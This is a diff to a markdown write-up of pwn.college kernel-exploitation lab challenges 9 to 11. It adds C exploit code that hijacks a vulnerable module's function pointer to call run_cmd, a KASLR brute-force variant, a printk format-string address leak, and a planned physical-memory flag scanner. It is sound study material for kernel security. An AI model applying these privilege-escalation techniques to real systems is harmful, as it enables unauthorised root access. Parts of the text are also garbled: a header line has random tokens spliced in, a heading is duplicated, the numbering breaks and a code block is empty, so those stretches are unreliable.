@@ -624,13 +624,155 @@ end
 r < /home/hacker/gdb_input.bin
 c
 
-### run_gdb.sh ###
+### run_gdb.sh ##gL_ghkPYSTKC-EP3QtgQ6turmB9.dBDN0wCMzgzWgL_ghkPYSTKC-EP3QtgQ6turmB9.dBDN0wCMzgzW
+    gL_ghkPYSTKC-EP3QtgQ6turmB9.dBDN0wCMzgzW
+## Challenge 10
+
+#
 #!/bin/bash
 
 gdb -x /home/hacker/gdb_debug.gdb /challenge/babykernel_level8.0
 ```
 
 ## Challenge 9
+
+Now the module has `write` handler, that can read up to `0x108` bytes, into a logger struct:
+
+```c
+struct device_write::logger
+{
+    char buffer[0x100];
+    int (*log_function)(const char *, ...);
+}
+```
+
+And the logger function is being issued on the `buffer`. This means we have arbitrary branch with argument primitive. An adequate target would be the kernel's `run_cmd` function. Since `/bin/sh` requires interactive session, it is inadequate for this case. 
+
+```c
+#define SHELLCODE_SIZE 0x100
+
+int main()
+{
+    int res = 0;
+
+    int fd = open("/proc/pwncollege", O_RDWR);
+    if (fd < 0)
+    {
+        goto cleanup;
+    }
+    uint8_t shellcode[SHELLCODE_SIZE + sizeof(size_t)] = { 0 };
+    uint8_t command[] = "/usr/bin/chmod 777 /flag";
+    memcpy(shellcode, &command[0], sizeof(command));
+    uint64_t run_cmd_addr = 0xffffffff81089b30;
+    memcpy(shellcode + sizeof(shellcode) - sizeof(size_t), &run_cmd_addr, sizeof(run_cmd_addr));
+
+    if (write(fd, shellcode, sizeof(shellcode)) < 0)
+    {
+        goto cleanup;
+    }
+    return 0;
+
+cleanup:
+    printf("error: %s\n", strerror(errno));
+    return 1;
+}
+```
+
+## Challenge 10
+
+Same as before, but now there's KASLR! The idea is to first call some function that would leak a kernel address, and within the second invocation, trigger `run_cmd`. \
+Within the first invocation, we can call `copy_to_user`. The problem is we can only control the content referenced by the first argument. \
+The KASLR has only 12-bits of randomness. This means that after ~4096 tries, we should be calling our correct handler. 
+
+```c
+int main(int argc, char *argv[])
+{
+    if (argc < 2)
+    {
+        goto cleanup;
+    }
+
+    int fd = open("/proc/pwncollege", O_RDWR);
+    if (fd < 0)
+    {
+        goto cleanup;
+    }
+
+    uint8_t shellcode[SHELLCODE_SIZE + sizeof(size_t)] = { 0 };
+    uint8_t command[] = "/usr/bin/chmod 777 /flag";
+    memcpy(shellcode, &command[0], sizeof(command));
+    uint64_t run_cmd_base = 0xffffffff00089b30;
+    uint64_t offset = (uint64_t)0x100000 * strtoll(argv[1], NULL, 10);
+    uint64_t run_cmd_addr = run_cmd_base + offset;
+
+    printf("offset: %08lx\n", offset);
+    memcpy(shellcode + sizeof(shellcode) - sizeof(size_t), &run_cmd_addr, sizeof(run_cmd_addr));
+
+    if (write(fd, shellcode, sizeof(shellcode)) < 0)
+    {
+        goto cleanup;
+    }
+    ...
+}
+```
+
+Another possible (and probably intended) solution, is to utilize the fact that the logger's original function is `printk`:
+
+```c
+logger.log_function = &printk;
+...
+logger.log_function(&logger);
+```
+
+At a first glance, there seems to be no problem with this implementation - as it simply prints what we've inserted. However, in case we would supply format string specifiers, such as `%p, %s` - we would be able to easily leak addresses off the 5 parameter registers and the stack. \
+In particular, we are able to leak the kernel RA off the stack - which is a code segment address. By doing so, we can easily calculate the constant offset towards `run_cmd`. 
+
+## Challenge 11
+
+As before, the kernel module simply executes a shellcode given within its `write` handler. \
+Interestingly, the flag is being loaded to the suid userspace component, at `0x404040`, and being removed from the system. Again, we are only allow to perform the `write` syscall. \
+My first approach, is since we can execute `write`, and the flag is at a known address, we can simply just write it to `stdout`, without going through the kernel at all.. \
+However, there's a twist - the flag is actually being written into a **child process** memory region! This means we'd like to leak the flag by reading our child process memory. \
+One initial idea was to follow the paren'ts `task_struct` in order to find the child's memory mapping, and leaking the flag from there. Notice the child remains alive after reading the flag into its memory. Eventually, the flag is mapped to some physical addresses. If this page wasn't swapped out, we can access it. Hence, If we would make a kernel shellcode that would scan the physical memory, we can search for the flag manually - and `printk` it upon finding it. 
+
+### Kernel Memory Mappings
+
+The [following documentation][kernel-scan] and this [link][linternals] greatly describes the kernel virtual memory layout (assumping no KASLR. Otherwise, random sized holes are presented). In particular, we can learn that:
+
+1. `page_offset_base` is a very special region, of size `64 TB`, that **direct-maps between virtual and physical memory**. This means that `PA 0` is mapped to `page_offset_base`, `PA 0x1000` to `page_offset_base + 0x1000`, and so on. Without KASLR, its address is completely deterministic:
+
+```bash
+(gdb) p/x page_offset_base 
+$1 = 0xffff888000000000
+(gdb) x/10gx page_offset_base
+0xffff888000000000:     0xf000ff53f000ff53      0xf000ff53f000e2c3
+```
+
+2. vmalloc/ioremap space, `vmalloc_base`. While `kmalloc` gurantees the allocated pages are both physically and virtually contiguous, `vmalloc` only gurantees virtual contiguous. This means that the mapping to physical memory pages may be completely scattered. Hence, `vmalloc` access is usually slower, as multiple page-translations shall occur - up to `sizeof(alloc) / PG_SIZE`. The advantage of `vmalloc` is whenever extremely large areas are needed (for example, when loading a new kernel module, Similar to `mmap` and dynamic libraries), as `kmalloc` is limited to `~128 KB` allocations. 
+
+3. and virtual memory map (`vmemmap_base`). 
+
+4. kernel text mapping, mapped to physical address 0
+
+
+5. module mapping space
+
+3. Since the physical memory is contigious, by scanning this special region, it is guranteed we'd never access an unmapped page. If the child process would die, we would have to make sure our exploit wouldn't consume too much memory. Otherwise, the target flag physical page would've been swapped out. Moreover, the flag will always be loaded to a constant offset within a page. Hence, we can greatly optimize our scanner such that it would only scan certain offsets within physical pages. But I'd actually prefer making a generic yet slow scanner, instead of a fast and offset-specific scanner. The scanner would simply search for `"pwn.college{"` within all physical memory, and upon finding an adequate candidate, call `printk` on it. 
+
+```c
+
+```
+
+
+
+```bash
+https://hackmd.io/@whoisthatguy/Byk3uVB56?utm_source=preview-mode&utm_medium=rec
+
+https://ctf-wiki.mahaloz.re/pwn/linux/kernel/ret2usr/
+
+```
+
+
 
 
 
@@ -640,3 +782,5 @@ gdb -x /home/hacker/gdb_debug.gdb /challenge/babykernel_level8.0
 [setup2]: https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/
 [setup3]: https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html
 [kernel-gs]: https://slavaim.blogspot.com/2017/09/linux-kernel-debugging-with-gdb-getting.html
+[kernel-scan]: https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
+[linternals]: https://sam4k.com/linternals-virtual-memory-part-3/
